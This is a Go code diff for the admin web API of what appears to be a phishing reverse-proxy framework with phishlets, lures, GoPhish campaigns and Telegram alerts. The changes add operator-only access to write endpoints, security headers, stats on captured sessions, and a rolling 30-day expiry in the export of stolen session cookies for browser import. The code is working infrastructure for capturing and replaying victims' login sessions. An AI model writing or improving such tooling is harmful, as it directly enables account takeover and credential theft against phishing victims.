@@ -3,6 +3,7 @@ package core
 import (
 	"encoding/json"
 	"fmt"
+	"math"
 	"net/http"
 	"sort"
 	"strconv"
@@ -64,56 +65,67 @@ func (w *WebAPI) Start(port int) {
 		}
 	}))
 
-	// Session endpoints
+	// Session endpoints — reads: any auth; writes: operator+
 	mux.HandleFunc("/api/sessions", w.requireAuth(w.handleSessions))
 	mux.HandleFunc("/api/sessions/download", w.requireAuth(w.handleSessionDownload))
-	mux.HandleFunc("/api/sessions/delete-bulk", w.requireAuth(w.handleDeleteBulk))
-	mux.HandleFunc("/api/sessions/mark-reviewed", w.requireAuth(w.handleMarkReviewed))
+	mux.HandleFunc("/api/sessions/delete-bulk", w.requireOperator(w.handleDeleteBulk))
+	mux.HandleFunc("/api/sessions/mark-reviewed", w.requireOperator(w.handleMarkReviewed))
 	mux.HandleFunc("/api/sessions/export", w.requireAuth(w.handleSessionsExport))
 	mux.HandleFunc("/api/sessions/", w.requireAuth(w.handleSessionDetail))
 
-	// Stats endpoints
+	// Stats endpoints (read-only)
 	mux.HandleFunc("/api/stats", w.requireAuth(w.handleStats))
 	mux.HandleFunc("/api/stats/timeline", w.requireAuth(w.handleStatsTimeline))
 	mux.HandleFunc("/api/stats/by-phishlet", w.requireAuth(w.handleStatsByPhishlet))
 
-	// Config endpoints
+	// Config endpoints — reads: any auth; update: operator+
 	mux.HandleFunc("/api/config", w.requireAuth(w.handleConfig))
 	mux.HandleFunc("/api/config/full", w.requireAuth(w.handleConfigFull))
-	mux.HandleFunc("/api/config/update", w.requireAuth(w.handleUpdateConfig))
+	mux.HandleFunc("/api/config/update", w.requireOperator(w.handleUpdateConfig))
 
-	// Phishlet endpoints
+	// Phishlet endpoints — reads: any auth; mutations: operator+
 	mux.HandleFunc("/api/phishlets", w.requireAuth(w.handlePhishlets))
-	mux.HandleFunc("/api/phishlets/enable", w.requireAuth(w.handlePhishletEnable))
-	mux.HandleFunc("/api/phishlets/disable", w.requireAuth(w.handlePhishletDisable))
-	mux.HandleFunc("/api/phishlets/hide", w.requireAuth(w.handlePhishletHide))
-	mux.HandleFunc("/api/phishlets/hostname", w.requireAuth(w.handlePhishletHostname))
+	mux.HandleFunc("/api/phishlets/enable", w.requireOperator(w.handlePhishletEnable))
+	mux.HandleFunc("/api/phishlets/disable", w.requireOperator(w.handlePhishletDisable))
+	mux.HandleFunc("/api/phishlets/hide", w.requireOperator(w.handlePhishletHide))
+	mux.HandleFunc("/api/phishlets/hostname", w.requireOperator(w.handlePhishletHostname))
 
-	// Lure endpoints
+	// Lure endpoints — reads: any auth; mutations: operator+
 	mux.HandleFunc("/api/lures", w.requireAuth(w.handleLures))
-	mux.HandleFunc("/api/lures/create", w.requireAuth(w.handleLureCreate))
-	mux.HandleFunc("/api/lures/delete", w.requireAuth(w.handleLureDelete))
+	mux.HandleFunc("/api/lures/create", w.requireOperator(w.handleLureCreate))
+	mux.HandleFunc("/api/lures/delete", w.requireOperator(w.handleLureDelete))
 
-	// GoPhish endpoints
+	// GoPhish endpoints (read-only)
 	mux.HandleFunc("/api/gophish/campaigns", w.requireAuth(w.handleGophishCampaigns))
 	mux.HandleFunc("/api/gophish/campaigns/results", w.requireAuth(w.handleGophishCampaignResults))
 
-	// Audit log
+	// Audit log (read-only)
 	mux.HandleFunc("/api/audit", w.requireAuth(w.handleAudit))
 
-	// Telegram settings
+	// Telegram settings — read: any auth; save: operator+
 	mux.HandleFunc("/get-telegram", w.requireAuth(w.handleGetTelegram))
-	mux.HandleFunc("/settings/save", w.requireAuth(w.handleSaveTelegram))
+	mux.HandleFunc("/settings/save", w.requireOperator(w.handleSaveTelegram))
 
-	// Legacy endpoints
-	mux.HandleFunc("/delete-all", w.requireAuth(w.handleDeleteAllSessions))
+	// Legacy endpoints (operator+)
+	mux.HandleFunc("/delete-all", w.requireOperator(w.handleDeleteAllSessions))
 	mux.HandleFunc("/logout", w.requireAuth(w.handleLogout))
 
 	// Index (root)
 	mux.HandleFunc("/", w.handleIndex)
 
-	log.Info("Starting Web Admin API at http://127.0.0.1:%d", port)
-	go http.ListenAndServe(fmt.Sprintf(":%d", port), mux)
+	log.Info("Starting Web Admin API at http://0.0.0.0:%d", port)
+	go http.ListenAndServe(fmt.Sprintf(":%d", port), securityHeaders(mux))
+}
+
+// securityHeaders adds defensive HTTP headers to every response.
+func securityHeaders(next http.Handler) http.Handler {
+	return http.HandlerFunc(func(rw http.ResponseWriter, req *http.Request) {
+		rw.Header().Set("X-Frame-Options", "DENY")
+		rw.Header().Set("X-Content-Type-Options", "nosniff")
+		rw.Header().Set("X-XSS-Protection", "1; mode=block")
+		rw.Header().Set("Referrer-Policy", "strict-origin-when-cross-origin")
+		next.ServeHTTP(rw, req)
+	})
 }
 
 // ---------- Index & Login Page ----------
@@ -178,6 +190,7 @@ func (w *WebAPI) handleSessionDownload(rw http.ResponseWriter, req *http.Request
 		return
 	}
 
+	defaultExpiry := time.Now().Add(30 * 24 * time.Hour).Unix()
 	cookieArray := []map[string]interface{}{}
 	for domain, domainCookies := range session.CookieTokens {
 		for name, cookie := range domainCookies {
@@ -192,7 +205,7 @@ func (w *WebAPI) handleSessionDownload(rw http.ResponseWriter, req *http.Request
 				"path":           cookie.Path,
 				"httpOnly":       cookie.HttpOnly,
 				"secure":         cookie.Secure,
-				"expirationDate": 1773674937,
+				"expirationDate": defaultExpiry,
 			})
 		}
 	}
@@ -310,22 +323,40 @@ func (w *WebAPI) handleSessionsExport(rw http.ResponseWriter, req *http.Request)
 
 func (w *WebAPI) handleStats(rw http.ResponseWriter, req *http.Request) {
 	sessions, _ := w.db.ListSessions()
+	total := len(sessions)
 	validCount := 0
 	for _, s := range sessions {
 		if len(s.CookieTokens) > 0 {
 			validCount++
 		}
 	}
+	invalidCount := total - validCount
+
+	validPct, invalidPct := 0.0, 0.0
+	if total > 0 {
+		validPct = math.Round(float64(validCount) / float64(total) * 100)
+		invalidPct = math.Round(float64(invalidCount) / float64(total) * 100)
+	}
+
+	validTrend := "bear"
+	if validPct >= 50 {
+		validTrend = "bull"
+	}
+	invalidTrend := "bear"
+	if invalidPct > 50 {
+		invalidTrend = "bull"
+	}
+
 	stats := map[string]interface{}{
-		"total":          len(sessions),
+		"total":          total,
 		"validCount":     validCount,
-		"invalidCount":   len(sessions) - validCount,
+		"invalidCount":   invalidCount,
 		"visitPercent":   100,
 		"visitTrend":     "bull",
-		"validPercent":   100,
-		"validTrend":     "bull",
-		"invalidPercent": 0,
-		"invalidTrend":   "bear",
+		"validPercent":   validPct,
+		"validTrend":     validTrend,
+		"invalidPercent": invalidPct,
+		"invalidTrend":   invalidTrend,
 	}
 	rw.Header().Set("Content-Type", "application/json")
 	json.NewEncoder(rw).Encode(stats)
